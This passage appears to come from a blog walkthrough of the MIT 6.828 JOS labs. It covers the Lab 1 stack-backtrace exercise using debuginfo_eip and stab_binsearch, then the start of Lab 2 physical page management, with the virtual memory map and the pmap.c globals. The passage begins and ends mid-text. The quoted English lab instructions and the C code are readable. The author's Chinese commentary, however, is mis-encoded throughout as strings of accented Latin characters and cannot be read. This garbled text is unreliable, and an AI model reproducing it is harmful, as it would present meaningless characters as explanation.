f010ffb8 f010004e f0111308<br>  ebp f010ff98  eip f010007a  args 00000003 00000004 00000000 f010004e f0111308<br>  ebp f010ffb8  eip f010007a  args 00000004 00000005 00000000 f010004e f0111308<br>  ebp f010ffd8  eip f01000fc  args 00000005 00001aac 00000640 00000000 00000000<br>  ebp f010fff8  eip f010003e  args 00000003 00001003 00002003 00003003 00004003<br>leaving test_backtrace 0<br>leaving test_backtrace 1<br>//...<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯ lab 1 çš„æœ€åä¸€ä¸ªç»ƒä¹ â€”â€”Exercise 12ï¼Œè¦æ±‚æˆ‘ä»¬æ‰“å°æ ˆå›æº¯ä¿¡æ¯çš„åŒæ—¶æ‰“å°å‡½æ•°åã€å‡½æ•°ä½äºçš„æºæ–‡ä»¶åŠä»–ä»¬åœ¨æºæ–‡ä»¶ä¸­çš„è¡Œå·</p><blockquote><p>Exercise 12.Â Modify your stack backtrace function to display, for eachÂ eip, the function name, source file name, and line number corresponding to thatÂ eip.</p><p>In <code>debuginfo_eip</code>, where do _<em>STAB</em>*Â come from? This question has a long answer; to help you to discover the answer, here are some things you might want to do:</p><ul><li>look in the fileÂ kern/kernel.ldÂ for _<em>STAB</em>*</li><li>runÂ objdump -h obj/kern/kernel</li><li>runÂ objdump -G obj/kern/kernel</li><li>runÂ gcc -pipe -nostdinc -O2 -fno-builtin -I. -MD -Wall -Wno-format -DJOS_KERNEL -gstabs -c -S kern/init.c, and look at init.s.</li><li>see if the bootloader loads the symbol table in memory as part of loading the kernel binary</li></ul><p>Complete the implementation of <code>debuginfo_eip</code> by inserting the call to <code>stab_binsearch</code> to find the line number for an address.</p><p>Add aÂ backtraceÂ command to the kernel monitor, and extend your implementation of <code>mon_backtrace</code> to call <code>debuginfo_eip</code> and print a line for each stack frame of the form:</p><p>K&gt; backtrace<br>Stack backtrace:<br>ebp f010ff78 eip f01008ae args 00000001 f010ff8c 00000000 f0110580 00000000<br>kern/monitor.c:143: monitor+106<br>ebp f010ffd8 eip f0100193 args 00000000 00001aac 00000660 00000000 00000000<br>kern/init.c:49: i386_init+59<br>ebp f010fff8 eip f010003d args 00000000 00000000 0000ffff 10cf9a00 0000ffff<br>kern/entry.S:70: +0<br>K&gt;</p><p>Each line gives the file name and line within that file of the stack frameâ€™sÂ eip, followed by the name of the function and the offset of theÂ eipÂ from the first instruction of the function (e.g.,Â monitor+106Â means the returnÂ eipÂ is 106 bytes past the beginning ofÂ monitor).</p><p>Be sure to print the file and function names on a separate line, to avoid confusing the grading script.</p><p>Tip: printf format strings provide an easy, albeit obscure, way to print non-null-terminated strings like those in STABS tables. <code>printf(&quot;%.*s&quot;, length, string)</code> prints at most <code>length</code> characters of <code>string</code>. Take a look at the printf man page to find out why this works.</p><p>You may find that some functions are missing from the backtrace. For example, you will probably see a call to <code>monitor()</code> but not to <code>runcmd()</code>. This is because the compiler in-lines some function calls. Other optimizations may cause you to see unexpected line numbers. If you get rid of theÂ -O2Â fromÂ GNUMakefile, the backtraces may make more sense (but your kernel will run more slowly).</p></blockquote><p>æˆ‘ä»¬å¦‚æœè¦ä»å¤´å®ç°è¿™ä¸ªåŠŸèƒ½çš„è¯å¯èƒ½ä¼šæœ‰ç‚¹éº»çƒ¦ï¼Œå¥½åœ¨ JOS ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå¯ä»¥å®ç°è¯¥åŠŸèƒ½çš„åº“å‡½æ•° <code>debuginfo_eip()</code>ï¼Œç›´æ¥æ‹¿æ¥ç”¨å°±è¡Œ</p><p>åœ¨æ‹¿æ¥ç”¨ä¹‹å‰æˆ‘ä»¬éœ€è¦æ³¨æ„å…¶å¹¶æœªå®ç°è¡Œå·åŠŸèƒ½ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‰‹åŠ¨åœ¨ <code>kern/debug.c</code> ä¸­è¡¥å…¨å®ç°ï¼Œè¿™ä¸€å—åŸç†æ¯”è¾ƒå¤æ‚ï¼Œä¸»è¦é å…¶æä¾›çš„ <code>stab_binsearch()</code> å‡½æ•°å®ç°ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥äº†è§£ä¸€ä¸‹ stabï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Search within [lline, rline] for the line number stab.</span><br><span class="hljs-comment">// If found, set info-&gt;eip_line to the right line number.</span><br><span class="hljs-comment">// If not found, return -1.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint:</span><br><span class="hljs-comment">//    There&#x27;s a particular stabs type used for line numbers.</span><br><span class="hljs-comment">//    Look at the STABS documentation and &lt;inc/stab.h&gt; to find</span><br><span class="hljs-comment">//    which one.</span><br><span class="hljs-comment">// Your code here.</span><br>stab_binsearch(stabs, &amp;lfun, &amp;rfun, N_SLINE, addr - info-&gt;eip_fn_addr);<br><br><span class="hljs-keyword">if</span> (lfun &lt;= rfun)<br>&#123;<br>    info-&gt;eip_line = stabs[lfun].n_desc;<br>&#125;<br>  <span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ backtrace ä¸­éœ€è¦æ³¨æ„çš„æ˜¯å…¶æä¾›çš„å‡½æ•°åæŒ‡é’ˆå¹¶éä»¥ <code>\0</code> ç»“å°¾æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ‰‹åŠ¨æŒ‡å®šè¾“å‡ºé•¿åº¦ï¼Œæœ€ç»ˆ backtrace å‡½æ•°çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br>    <span class="hljs-comment">// Your code here.</span><br>    <span class="hljs-type">uint32_t</span> *old_ebp, last_eip;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Eipdebuginfo</span> <span class="hljs-title">eipdebuginfo</span>;</span><br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;movl %%ebp, %0;&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (old_ebp))</span>;<br>    cprintf(<span class="hljs-string">&quot;Stack backtrace:\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (old_ebp)<br>    &#123;<br>        last_eip = old_ebp[<span class="hljs-number">1</span>];<br>        debuginfo_eip(last_eip, &amp;eipdebuginfo);<br>        cprintf(<span class="hljs-string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, <br>            old_ebp, last_eip, old_ebp[<span class="hljs-number">2</span>], old_ebp[<span class="hljs-number">3</span>], old_ebp[<span class="hljs-number">4</span>], old_ebp[<span class="hljs-number">5</span>], old_ebp[<span class="hljs-number">6</span>]);<br>        cprintf(<span class="hljs-string">&quot;         %s:%d: &quot;</span>, <br>            eipdebuginfo.eip_file, eipdebuginfo.eip_line);<br>        cprintf(<span class="hljs-string">&quot;%.*s+%d\n&quot;</span>,<br>            eipdebuginfo.eip_fn_namelen, eipdebuginfo.eip_fn_name, last_eip - eipdebuginfo.eip_fn_addr);<br>        old_ebp = (<span class="hljs-type">uint32_t</span> *) old_ebp[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆè¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/02/21/3JksWlBiI7VNYEG.png" alt="imagepng"></p><p>è¿è¡Œ <code>make grade</code> ä»¥æ£€æŸ¥ lab 1 çš„å®Œæˆæƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸå®Œæˆäº† lab 1 çš„ä»£ç éƒ¨åˆ†ï¼Œè‡³æ­¤ï¼Œ lab 1 ç»“æŸ</p><p><img src="https://s2.loli.net/2022/02/21/GM57bwBngJP6UdO.png" alt="imagepng"></p><h1>0x02.Lab 2: Memory Management</h1><p>åœ¨è¿™ä¸€éƒ¨åˆ†å½“ä¸­æˆ‘ä»¬éœ€è¦å®ç° OS kernel çš„<strong>å†…å­˜ç®¡ç†æ¨¡å—</strong>ï¼Œåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ul><li><p>ç‰©ç†å†…å­˜åˆ†é…å™¨ï¼šæˆ‘ä»¬éœ€è¦å°†æ‰€æœ‰çš„ç‰©ç†å†…å­˜ä»¥ã€Œé¡µã€ä¸ºå•ä½è¿›è¡Œç®¡ç†ï¼Œå¹¶è®°å½•ä¸‹å„ä¸ªé¡µçš„çŠ¶æ€ï¼ˆç©ºé—²æˆ–å·²è¢«åˆ†é…ï¼‰ã€å…±äº«è¯¥é¡µé¢çš„è¿›ç¨‹æ•°é‡ç­‰ï¼Œå¹¶å®ç°åˆ†é…ä¸é‡Šæ”¾ç‰©ç†é¡µçš„å‡½æ•°</p></li><li><p>è™šæ‹Ÿå†…å­˜åˆ†é…å™¨ï¼šæˆ‘ä»¬éœ€è¦å®Œæˆå¯¹é¡µè¡¨çš„ç®¡ç†ï¼Œä¸»è¦æ˜¯å®ç°è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„çš„å»ºç«‹åŠŸèƒ½</p></li></ul><p>é¦–å…ˆç”¨ git æ‹‰ lab2 çš„ä»£ç ä¸‹æ¥ï¼Œè¿™é‡Œç¬”è€…å‰é¢ lab 1 çš„ä»£ç æ²¡æœ‰ handin æ‰€ä»¥å‰é¢æç¤ºäº†ä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br>M    kern/kdebug.c<br>M    kern/monitor.c<br>M    lib/printfmt.c<br>Branch &#x27;lab2&#x27; set up to track remote branch &#x27;lab2&#x27; from &#x27;origin&#x27;.<br>Switched to a new branch &#x27;lab2&#x27;<br></code></pre></td></tr></table></figure><p>lab 2 æ–°å¢äº†è¿™äº›æ–‡ä»¶ï¼š</p><ul><li>inc/memlayout.h</li><li>kern/pmap.c</li><li>kern/pmap.h</li><li>kern/kclock.h</li><li>kern/kclock.c</li></ul><p><code>memlayout.h</code> ä¸­æè¿°äº†è™šæ‹Ÿåœ°å€ç©ºé—´çš„å¸ƒå±€ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ä¿®æ”¹ <code>pmap.c</code> æ¥å®ç°ï¼›åœ¨ <code>memlayout.h</code> ä¸ <code>pmap.h</code> ä¸­å®šä¹‰äº† <code>Pageinfo</code> ç»“æ„ä½“ï¼Œç”¨ä»¥æè¿°å•ä¸ªç‰©ç†é¡µï¼Œä¸ Linux å†…æ ¸çš„åšæ³•ç±»ä¼¼ï¼Œä¸€ä¸ª Pageinfo å¯¹åº”ä¸€å¼ ç‰©ç†é¡µï¼Œæ‰€ä»¥åœ¨è¯¥ç»“æ„ä½“ä¸­åªéœ€è¦å­˜å‚¨è¯¥é¡µçš„çŠ¶æ€å³å¯ï¼›<code>kclock.c</code> ä¸ <code>kclock.h</code> ç”¨ä»¥æ“ä½œç”µæ± åå¤‡æ—¶é’Ÿä¸ CMOS RAM ç¡¬ä»¶ï¼Œå…¶åœ¨ BIOS ä¸­è®°å½•äº† PC çš„ç‰©ç†å†…å­˜å®¹é‡ä¸å…¶ä»–ä¸œè¥¿ï¼Œåœ¨ <code>pmap.c</code> ä¸­çš„ä»£ç éœ€è¦è¯»å–è¯¥è®¾å¤‡ä»¥è®¡ç®—å¯ç”¨ç‰©ç†å†…å­˜ï¼Œè¿™éƒ¨åˆ†ä»£ç  xv6 å·²ç»å¸®æˆ‘ä»¬å®ç°å¥½äº†æ‰€ä»¥æˆ‘ä»¬æš‚æ—¶ä¸éœ€è¦äº†è§£ CMOS çš„åŸç†</p><blockquote><p>åœ¨ç¬”è€…çš„ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">ã€CODE.0x00ã€‘ä»é›¶å¼€å§‹çš„32ä½æ“ä½œç³»ç»Ÿå¼€å‘æ‰‹è®° - arttnba3â€™s blog</a> ä¸­è®°å½•äº†ä¸‰ç§è·å–å¯ç”¨ç‰©ç†å†…å­˜å®¹é‡ä¸å¸ƒå±€çš„æ–¹å¼ï¼ŒåŸå‹æ¥è‡ª Linux å†…æ ¸</p></blockquote><p>åœ¨ <code>memlayout.h</code> ä¸­å¯¹å°†è¦å»ºç«‹çš„å†…å­˜å¸ƒå±€æè¿°å¦‚ä¸‹ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">/<span class="hljs-symbol">*</span><br> <span class="hljs-symbol">*</span> Virtual memory map:                                Permissions<br> <span class="hljs-symbol">*</span>                                                    kernel/user<br> <span class="hljs-symbol">*</span><br> <span class="hljs-symbol">*</span>    4 Gig --------&gt;  +------------------------------+<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">                              </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string"> *                     :              .               :</span><br><span class="hljs-string"> *                     :              .               :</span><br><span class="hljs-string"> *                     :              .               :</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">   Remapped Physical Memory   </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *    KERNBASE, ----&gt;  +------------------------------+ 0xf0000000      --+</span><br><span class="hljs-string"> *    KSTACKTOP        </span>|<span class="hljs-string">     CPU0&#x27;s Kernel Stack      </span>|<span class="hljs-string"> RW/--  KSTKSIZE   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string"> - - - - - - - - - - - - - - -</span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">      Invalid Memory (*)      </span>|<span class="hljs-string"> --/--  KSTKGAP    </span>|<br> <span class="hljs-symbol">*</span>                     +------------------------------+                   |<span class="hljs-string"></span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">     CPU1&#x27;s Kernel Stack      </span>|<span class="hljs-string"> RW/--  KSTKSIZE   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string"> - - - - - - - - - - - - - - -</span>|<span class="hljs-string">                 PTSIZE</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">      Invalid Memory (*)      </span>|<span class="hljs-string"> --/--  KSTKGAP    </span>|<br> <span class="hljs-symbol">*</span>                     +------------------------------+                   |<span class="hljs-string"></span><br><span class="hljs-string"> *                     :              .               :                   </span>|<br> <span class="hljs-symbol">*</span>                     :              .               :                   |<span class="hljs-string"></span><br><span class="hljs-string"> *    MMIOLIM ------&gt;  +------------------------------+ 0xefc00000      --+</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">       Memory-mapped I/O      </span>|<span class="hljs-string"> RW/--  PTSIZE</span><br><span class="hljs-string"> * ULIM, MMIOBASE --&gt;  +------------------------------+ 0xef800000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">  Cur. Page Table (User R-)   </span>|<span class="hljs-string"> R-/R-  PTSIZE</span><br><span class="hljs-string"> *    UVPT      ----&gt;  +------------------------------+ 0xef400000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">          RO PAGES            </span>|<span class="hljs-string"> R-/R-  PTSIZE</span><br><span class="hljs-string"> *    UPAGES    ----&gt;  +------------------------------+ 0xef000000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">           RO ENVS            </span>|<span class="hljs-string"> R-/R-  PTSIZE</span><br><span class="hljs-string"> * UTOP,UENVS ------&gt;  +------------------------------+ 0xeec00000</span><br><span class="hljs-string"> * UXSTACKTOP -/       </span>|<span class="hljs-string">     User Exception Stack     </span>|<span class="hljs-string"> RW/RW  PGSIZE</span><br><span class="hljs-string"> *                     +------------------------------+ 0xeebff000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string"> --/--  PGSIZE</span><br><span class="hljs-string"> *    USTACKTOP  ---&gt;  +------------------------------+ 0xeebfe000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">      Normal User Stack       </span>|<span class="hljs-string"> RW/RW  PGSIZE</span><br><span class="hljs-string"> *                     +------------------------------+ 0xeebfd000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">                              </span>|<br> <span class="hljs-symbol">*</span>                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br> <span class="hljs-symbol">*</span>                     .                              .<br> <span class="hljs-symbol">*</span>                     .                              .<br> <span class="hljs-symbol">*</span>                     .                              .<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">     Program Data &amp; Heap      </span>|<br> <span class="hljs-symbol">*</span>    UTEXT --------&gt;  +------------------------------+ 0x00800000<br> <span class="hljs-symbol">*</span>    PFTEMP -------&gt;  |<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string">        PTSIZE</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<br> <span class="hljs-symbol">*</span>    UTEMP --------&gt;  +------------------------------+ 0x00400000      --+<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string"> - - - - - - - - - - - - - - -</span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">  User STAB Data (optional)   </span>|<span class="hljs-string">                 PTSIZE</span><br><span class="hljs-string"> *    USTABDATA ----&gt;  +------------------------------+ 0x00200000        </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>    0 ------------&gt;  +------------------------------+                 --+<br> <span class="hljs-symbol">*</span><br> <span class="hljs-symbol">*</span> (<span class="hljs-symbol">*</span>) Note: The kernel ensures that <span class="hljs-string">&quot;Invalid Memory&quot;</span> is <span class="hljs-symbol">*</span>never<span class="hljs-symbol">*</span> mapped.<br> <span class="hljs-symbol">*</span>     <span class="hljs-string">&quot;Empty Memory&quot;</span> is normally unmapped, but user programs may map pages<br> <span class="hljs-symbol">*</span>     there if desired.  JOS user programs map pages temporarily at UTEMP.<br> <span class="hljs-symbol">*</span>/<br></code></pre></td></tr></table></figure><h2 id="Part-1-Physical-Page-Management">Part 1: Physical Page Management</h2><p>æ“ä½œç³»ç»Ÿåº”å½“è¦ç®¡ç†å¥½å†…å­˜ä¸­çš„æ¯ä¸€å¼ å†…å­˜é¡µï¼ŒJOS åŒæ ·ä»¥é¡µä¸ºç²’åº¦è¿›è¡Œç®¡ç†ï¼Œåœ¨æœ¬éƒ¨åˆ†ä¸­æˆ‘ä»¬éœ€è¦ä¸º JOS ç¼–å†™ä¸€ä¸ªç‰©ç†å†…å­˜é¡µåˆ†é…å™¨ï¼Œå…¶ä½¿ç”¨ä¸€ä¸ªé“¾è¡¨æ¥å°†ç©ºé—²çš„ç‰©ç†é¡µå¯¹åº”çš„ Pageinfo ç»“æ„ä½“ç›¸è¿</p><p>åœ¨ Exercise 1 ä¸­è¦æ±‚æˆ‘ä»¬å®ç°è¯¥ç‰©ç†å†…å­˜é¡µåˆ†é…å™¨çš„å‡ ä¸ªå‡½æ•°</p><blockquote><p>Exercise 1.Â In the fileÂ kern/pmap.c, you must implement code for the following functions (probably in the order given).</p><p><code>boot_alloc()</code><br><code>mem_init()</code>Â (only up to the call toÂ <code>check_page_free_list(1)</code>)<br><code>page_init()</code><br><code>page_alloc()</code><br><code>page_free()</code></p><p><code>check_page_free_list()</code>Â andÂ <code>check_page_alloc()</code>Â test your physical page allocator. You should boot JOS and see whetherÂ <code>check_page_alloc()</code>Â reports success. Fix your code so that it passes. You may find it helpful to add your ownÂ <code>assert()</code>s to verify that your assumptions are correct.</p></blockquote><p>ç¬”è€…æœ¬äººå¾ˆæƒ³ç›´æ¥å†™ä¸€ä¸ª buddy systemï¼ˆç¬‘ï¼‰ï¼Œä½†ä¸€æ˜¯æŠ€æœ¯åŠ›å¥½åƒä¸å¤§å¤Ÿçš„æ ·å­ï¼ŒäºŒæ˜¯åœ¨å¯¹ JOS æ²¡æœ‰è¶³å¤Ÿäº†è§£çš„æƒ…å†µä¸‹è¿˜æ˜¯å…ˆæŒ‰ç…§ç»™çš„æ³¨é‡Šæ¥å®ç°</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ <code>kern/pmap.c</code> ï¼Œåœ¨ä¸€å¼€å¤´å£°æ˜äº†è¿™å‡ ä¸ªå…¨å±€å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// These variables are set by i386_detect_memory()</span><br><span class="hljs-type">size_t</span> npages;<span class="hljs-comment">// Amount of physical memory (in pages)</span><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> npages_basemem;<span class="hljs-comment">// Amount of base memory (in pages)</span><br><br><span class="hljs-comment">// These variables are set in mem_init()</span><br><span class="hljs-type">pde_t</span> *kern_pgdir;<span class="hljs-comment">// Kernel&#x27;s initial page directory</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pages</span>;</span><span class="hljs-comment">// Physical page state array</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">page_free_list</span>;</span><span class="hljs-comment">// Free list of physical pages</span><br></code></pre></td></tr></table></figure><ul><li><code>npages</code>ï¼šä»¥é¡µä¸ºå•ä½çš„ç‰©ç†å†…å­˜æ€»é‡</li><li><code>npages_basemem</code>ï¼šä»¥é¡µä¸ºå•ä½çš„å¯ç”¨å†…å­˜æ€»é‡</li><li><code>kern_pgdir</code>ï¼šå†…æ ¸çš„é¡µå…¨å±€ç›®å½•è¡¨</li><li><code>pages</code>ï¼šé¡µç»“æ„ä½“ï¼ˆPageInfoï¼‰æ•°ç»„çš„æŒ‡é’ˆ</li><li><code>page_free_list</code>ï¼šç©ºé—²çš„ç‰©ç†é¡µå•å‘é“¾è¡¨å¤´èŠ‚ç‚¹</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªå†…å­˜ç®¡ç†æœ‰ç‚¹ç±»ä¼¼äº FLATMEM å†…å­˜æ¨¡å‹ï¼šç›´æ¥ç”±ä¸€ä¸ªå¤§çš„ page ç»“æ„ä½“æ•°ç»„å¯¹åº”ä¸€å—å¯ç”¨ç‰©ç†å†…å­˜åŒºåŸŸã€‚å†åŠ ä¸Š â€œåªæœ‰ä¸€ä¸ªå•å‘é“¾è¡¨çš„ buddy systemâ€ï¼Œå¤§æ¦‚å°±å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆç¬”è€…æ‹¿ä¸¤å¼ è®² Linuxçš„å›¾æ‹†å¼€æ‹¼æˆçš„ï¼‰</p><p><img src="https://s2.loli.net/2022/03/15/umCBxeDPFc7I23h.png" alt="JOSçš„å†…å­˜ç®¡ç†"></p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼š<strong>PageInfo ç»“æ„ä½“å¹¶ä¸éœ€è¦å­˜å‚¨åœ°å€ä¿¡æ¯ï¼Œå› ä¸ºä»–æ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ç›´æ¥å¯¹åº”æ•´ä¸ªç‰©ç†å†…å­˜ç©ºé—´</strong>ï¼Œç›¸åº”åœ°å°±æœ‰ pages[0] å¯¹åº”åœ°å€ 0ï¼Œpages[1] å¯¹åº”åœ°å€ 0x1000â€¦<strong>æˆ‘ä»¬å…¶å®å¾ˆå®¹æ˜“èƒ½å¾—åˆ° PageInfo åœ°å€åˆ°ç‰©ç†é¡µå¸§ä¹‹é—´çš„è½¬æ¢å…¬å¼</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹åœ¨ <code>kern/pmap.h</code> ä¸­å®ç°çš„ä¸¤ä¸ªè½¬æ¢å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">physaddr_t</span><br><span class="hljs-title function_">page2pa</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> PageInfo *pp)</span><br>&#123;<br><span class="hljs-keyword">return</span> (pp - pages) &lt;&lt; PGSHIFT;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> PageInfo*<br><span class="hljs-title function_">pa2page</span><span class="hljs-params">(<span class="hljs-type">physaddr_t</span> pa)</span><br>&#123;<br><span class="hljs-keyword">if</span> (PGNUM(pa) &gt;= npages)<br>panic(<span class="hljs-string">&quot;pa2page called with invalid pa&quot;</span>);<br><span class="hljs-keyword">return</span> &amp;pages[PGNUM(pa)];<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæˆ‘ä»¬ç°åœ¨æ‰€è¯´çš„éƒ½æ˜¯è™šæ‹Ÿåœ°å€ï¼Œæˆ‘ä»¬ä»éœ€è¦ä¸€ä¸ªè™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´ç›´æ¥è½¬æ¢çš„å‡½æ•°ï¼Œå‚ç…§ä¸Šå›¾ï¼Œç”±äºæ˜¯çº¿æ€§æ˜ 